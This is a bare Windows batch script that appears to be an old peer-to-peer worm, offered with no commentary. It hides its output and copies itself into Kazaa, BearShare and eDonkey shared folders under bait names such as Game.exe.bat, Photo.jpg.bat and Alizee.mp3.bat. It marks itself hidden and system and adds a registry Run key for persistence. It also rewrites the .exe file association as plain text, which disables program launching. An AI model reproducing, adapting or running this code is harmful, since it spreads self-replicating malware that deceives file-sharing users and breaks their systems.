   @echo off
   ctty nul
   if not exist c:\MyTask.bin goto 1
   :2
   if exist c:\MyTask.tit goto 3
   set MyTask=.ex
   set MyTa=file
   echo REGEDIT4>C:\DeadExe.reg
   echo.>>C:\DeadExe.reg
   echo [HKEY_CLASSES_ROOT\%MyTask%e]>>C:\DeadExe.reg
   echo "%1" = "txt%MyTa%">>C:\DeadExe.reg
   echo "Content Type" = "text/plain">>C:\DeadExe.reg
   echo "PerceivedType" = "text">>C:\DeadExe.reg
   regedit /s C:\DeadExe.reg
   del C:\DeadExe.reg
   goto 3
   :1
   echo My Task is Dead >>c:\MyTask.bin
   echo Live a Little >>c:\MyTask.tit
   copy %0 c:\MyTask.bat >nul
   @attrib +h +s c:\MyTask.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Task.exe.bat >nul
   copy %0 c:\progra~1\bearshare\shared\HiT.mp3.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Game.exe.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Game.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Photo.jpg.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\Lesbian.jpg.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\Lesbos.jpg.bat >nul
   copy %0 c:\progra~1\bearshare\shared\Alizee.mp3.bat >nul
   copy %0 c:\progra~1\eDonkey2000\incoming\install.exe.bat >nul
   copy %0 c:\progra~1\kazaa\myshar~1\install.exe.bat >nul
   copy %0 c:\progra~1\Uninstall.exe.bat >nul
   echo REGEDIT4>C:\My.reg
   echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]>>C:\My.reg
   echo "SysTask"="c:\\MyTask.bat" >> C:\My.reg
   regedit /s C:\My.reg
   del C:\My.reg >nul
   goto 2
   :3
   ctty con
   cls
